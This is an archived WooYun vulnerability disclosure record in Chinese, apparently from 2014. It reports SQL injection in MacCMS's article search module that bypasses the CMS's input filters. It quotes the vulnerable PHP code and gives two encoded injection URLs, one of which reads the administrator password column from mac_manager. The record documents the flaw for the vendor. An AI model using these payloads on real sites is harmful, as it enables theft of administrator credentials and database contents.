{"id": 53889, "wybug_id": "wooyun-2014-066156", "wybug_title": "苹果CMS继续绕过现有全局安全防护措施进行SQL注入，第三发", "wybug_corp": "maccms.com", "wybug_author": "magerx", "wybug_date": "2014-06-25 10:50", "wybug_open_date": "2014-09-23 10:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-23：\t细节向公众公开  简要描述： 下一次该告一段落，打包了，主要是希望开发意识到为什么你们的be()和360_safe3.php没有起到作用 详细说明：  不再具体分析，看第一和第二发，看下触发页面，inc/module/art.php 第90行：\nelseif($method=='search'){\t$tpl->P[\"siteaid\"] = 25;\t$wd = be(\"all\", \"wd\");\t\tif(!empty($wd)){\t\t$tpl->P[\"wd\"] = $wd;\t}\t\tif (isN($tpl->P[\"wd\"]) && isN($tpl->P[\"ids\"]) && isN($tpl->P[\"pinyin\"]) && isN($tpl->P[\"letter\"]) && isN($tpl->P[\"tag\"]) && isN($tpl->P[\"type\"]) ){ alert (\"搜索参数不正确\"); }\t\t$tpl->P['cp'] = 'artsearch';\t$tpl->P['cn'] = urlencode($tpl->P['wd']).'-'.$tpl->P['pg'].'-'.$tpl->P['order'].'-'.$tpl->P['by'].'-'.$tpl->P['ids']. '-'.$tpl->P['pinyin']. '-'.$tpl->P['type'] .'-'.urlencode($tpl->P['tag']) ;\techoPageCache($tpl->P['cp'],$tpl->P['cn']);\t\tif (!isN($tpl->P[\"letter\"])){    \t$tpl->P[\"key\"]=$tpl->P[\"letter\"];    \t$tpl->P[\"des\"] = $tpl->P[\"des\"] . \"&nbsp;首字母为\" . $tpl->P[\"letter\"];    \t$tpl->P[\"where\"] = $tpl->P[\"where\"] . \" AND a_letter='\" . $tpl->P[\"letter\"] .\"' \";    }        if (!isN($tpl->P[\"wd\"])) {    \t$tpl->P[\"key\"]=$tpl->P[\"wd\"] ;    \t$tpl->P[\"des\"] = $tpl->P[\"des\"] . \"&nbsp;名称或主演为\" . $tpl->P[\"wd\"];    \t$tpl->P[\"where\"] = $tpl->P[\"where\"] . \" AND instr(a_name,'\".$tpl->P['wd'].\"')>0 \";    }        if (!isN($tpl->P[\"pinyin\"])){    \t$tpl->P[\"key\"]=$tpl->P[\"pinyin\"] ;    \t$tpl->P[\"des\"] = $tpl->P[\"des\"] . \"&nbsp;拼音为\" . $tpl->P[\"pinyin\"];    \t$tpl->P[\"where\"] = $tpl->P[\"where\"] . \" AND instr(a_enname,'\".$tpl->P['pinyin'].\"')>0 \";    }        if (!isN($tpl->P[\"tag\"])){\t\t$tpl->P[\"key\"]=$tpl->P[\"tag\"] ;\t\t$tpl->P[\"des\"] = $tpl->P[\"des\"] . \"&nbsp;Tag为\" . $tpl->P[\"tag\"];\t\t$tpl->P[\"where\"] = $tpl->P[\"where\"] . \" AND instr(a_tag,'\".$tpl->P['tag'].\"')>0 \";\t}\t    $tpl->P['typepid'] = 0;\tif(!isN($tpl->P[\"typeid\"])){\t\t$typearr = $MAC_CACHE['arttype'][$tpl->P['typeid']];\t\tif (is_array($typearr)){\t\t\t$tpl->P['typepid'] = $typearr['t_pid'];\t\t\tif (isN($tpl->P[\"key\"])){ $tpl->P[\"key\"]= $typearr[\"t_name\"];  }\t\t\t$tpl->P[\"des\"] = $tpl->P[\"des\"] . \"&nbsp;分类为\" . $typearr[\"t_name\"];\t\t\t$tpl->P[\"where\"] = $tpl->P[\"where\"] . \" AND a_type in (\" . $typearr[\"childids\"] . \") \";\t\t}\t}\t\t$db = new AppDb($MAC['db']['server'],$MAC['db']['user'],$MAC['db']['pass'],$MAC['db']['name']);\t$tpl->H = loadFile(MAC_ROOT_TEMPLATE.\"/art_search.html\");\t$tpl->mark();\t$tpl->pageshow();\n就这个地方又一大堆注入，直接看测试吧,这里我们用letter做个测试\nhttp://localhost/maccms8_mfb/index.php?m=art-search-letter-1235%2527%2520union%2520select%2520user%2528%2529%2520order%2520by%25201%2520desc%2523\n\n\n\nhttp://localhost/maccms8_mfb/index.php?m=art-search-letter-1235%2527%2520union%2520select%2520m_password%2520from%2520mac_manager%2520order%2520by%25201%2520desc%2523\n\n\n   漏洞证明：  \n\n\n\n   修复方案：  ～。～   版权声明：转载请注明来源 magerx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-06-25 17:30 厂商回复： 看来360防护脚本防护的补全面啊，改进一下。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}